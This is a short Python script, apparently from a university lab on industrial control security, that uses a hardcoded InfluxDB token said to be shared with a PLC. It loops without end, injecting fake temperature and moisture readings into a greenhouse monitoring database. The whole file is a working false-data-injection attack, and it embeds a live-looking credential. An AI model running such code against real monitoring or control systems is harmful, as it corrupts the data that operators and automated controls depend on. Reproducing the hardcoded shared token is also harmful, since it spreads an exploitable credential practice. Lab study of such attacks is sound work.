# influx_attacker.py
from influxdb_client import InfluxDBClient, Point, WritePrecision
from datetime import datetime
import random

# Target InfluxDB connection (attacker knows these values)
url = "http://localhost:8086"
token ="IlFwe-6RV4MhhKYaJh-zweHAvsXRCwo7cOHWI04BfFhEFhrsQB2l2hvsFDa8u7OsCZqWJ7cORiDlH100k12DbA=="  # Attacker uses same token as PLC
org = "SUTD"
bucket = "greenhouse"

client = InfluxDBClient(url=url, token=token, org=org)
write_api = client.write_api()

print("⚠️ Attacker injecting fake data into InfluxDB...")
while True:
    fake_point = (
        Point("greenhouse")
        .field("temperature", random.uniform(29, 40))  # Unrealistic value
        .field("moisture", random.uniform(80, 100))
    )
    write_api.write(bucket=bucket, record=fake_point)
    print("Injected fake data into Influx")
